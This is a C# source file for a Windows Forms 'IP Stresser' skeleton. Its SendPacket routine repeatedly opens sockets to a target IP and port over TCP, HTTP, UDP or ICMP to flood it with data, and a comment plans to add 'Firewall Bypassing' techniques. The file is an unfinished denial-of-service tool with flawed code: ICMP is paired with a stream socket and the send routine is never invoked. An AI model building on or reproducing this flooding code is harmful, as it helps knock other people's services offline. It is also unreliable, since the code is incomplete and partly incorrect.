using System;
using System.Net;
using System.Linq;
using System.Text;
using System.Net.Sockets;
using System.Windows.Forms;
using System.Threading.Tasks;
using System.Collections.Generic;


namespace Dash_IP_Stresser
{
    static class Socks
    {
        static class Types
        {
            public const int HTTP = 0;
            public const int ICMP = 1;
            public const int TCP = 2;
            public const int UDP = 3;
        };

        static class Techniques
        {
            /*[Add in some techniques, Firewall Bypassing and other things]*/
        };


        static void SendPacket(string target, int port, string data, int timeout, int requests, int type, int technique /*[Optional HTTP Parameters]*/)
        {
            ProtocolType protocol_type;
            SocketType sock_type;

            switch (type)
            {
                case Types.HTTP:
                case Types.TCP:
                {
                    protocol_type = ProtocolType.Tcp;
                    sock_type = SocketType.Stream;

                    break;
                };

                case Types.ICMP:
                {
                    protocol_type = ProtocolType.Icmp;
                    sock_type = SocketType.Stream;

                    break;
                };

                case Types.UDP:
                {
                    protocol_type = ProtocolType.Udp;
                    sock_type = SocketType.Dgram;

                    break;
                };

                default:
                {
                    protocol_type = ProtocolType.Unknown;
                    sock_type = SocketType.Unknown;

                    break;
                };
            };

            byte[] bytes = Encoding.ASCII.GetBytes(data);

            for (int request = 0; request < requests; request += 1)
            {
                Socket socket = new Socket(AddressFamily.InterNetwork, sock_type, protocol_type)
                {
                    SendBufferSize = bytes.Length,
                    SendTimeout = 0,
                };

                IAsyncResult result = socket.BeginConnect(IPAddress.Parse(target), port, null, null);
                result.AsyncWaitHandle.WaitOne(timeout, true);

                if (socket.Connected)
                {
                    socket.Send(bytes);
                    socket.EndConnect(result);

                    Program.apple.packets_sent.Text = (int.Parse(Program.apple.packets_sent.Text) + 1).ToString();
                }

                else
                {
                    // Target is not responding, may be down?
                };

                socket.Close();
            };
        }
    };


    class Apple : Form
    {
        public TextBox packets_sent = new TextBox();

        public Apple()
        {

        }
    };


    static class Program
    {
        public static Apple apple;

        static void Main(string[] args)
        {
            //- HTTP, TCP, UDP and ICMPv4 support!

            apple = new Apple();
            Application.Run(apple);
        }
    };
};
